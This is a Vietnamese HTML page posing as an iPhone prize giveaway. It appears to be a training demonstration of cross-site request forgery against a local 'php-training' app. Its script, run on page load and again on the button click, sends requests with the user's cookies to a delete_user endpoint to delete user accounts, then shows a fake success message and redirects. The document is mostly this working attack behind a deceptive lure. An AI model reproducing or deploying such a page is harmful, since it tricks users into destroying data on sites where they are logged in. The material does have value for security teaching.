<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trang Web Hấp Dẫn - Nhận Quà</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; }
        .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; }
        .gift-box { font-size: 80px; margin: 20px 0; }
        .btn { background: #ff4757; color: white; padding: 15px 30px; border: none; border-radius: 25px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px; }
        .btn:hover { background: #ff3742; }
        .hidden { display: none; }
        .loading { font-size: 24px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 CHÚC MỪNG! 🎉</h1>
        <h2>Bạn đã trúng thưởng iPhone 17 Pro Max!</h2>
        <div class="gift-box">🎁</div>
        <p>Chỉ cần click vào nút bên dưới để nhận quà ngay lập tức!</p>
        
        <a href="#" class="btn" onclick="claimGift()">🤑 NHẬN QUÀ NGAY</a>
        
        <div id="loading" class="loading hidden">⏳ Đang xử lý quà tặng của bạn...</div>
        <div id="success" class="hidden">
            <h3>✅ Hoàn thành! Quà đã được xử lý.</h3>
            <p>Bạn sẽ được chuyển hướng sau 3 giây...</p>
        </div>
    </div>

    <script>
        function claimGift() {
            // Ẩn nút và hiển thị loading
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').classList.remove('hidden');
            
            // Thực hiện CSRF Attack
            performCSRFAttack();
            
            // Hiển thị success message sau 2 giây
            setTimeout(() => {
                document.getElementById('loading').classList.add('hidden');
                document.getElementById('success').classList.remove('hidden');
            }, 2000);
            
            // Chuyển hướng sau 5 giây
            setTimeout(() => {
                window.location.href = 'http://localhost/php-training/list_users.php';
            }, 5000);
        }

        function performCSRFAttack() {
            // Phương pháp 1: Sử dụng fetch API (hiện đại nhất)
            fetch('http://localhost/php-training/delete_user.php?id=1', {
                method: 'GET',
                credentials: 'include'  // Quan trọng: gửi cookie/session
            }).catch(err => console.log('Attack 1 completed'));

            // Phương pháp 2: Sử dụng XMLHttpRequest
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://localhost/php-training/delete_user.php?id=2', true);
            xhr.withCredentials = true;  // Quan trọng: gửi cookie/session
            xhr.send();


            
        }

        // Tự động thực hiện attack khi trang load (ẩn)
        window.onload = function() {
            setTimeout(performCSRFAttack, 1000);
        };
    </script>
</body>
</html>
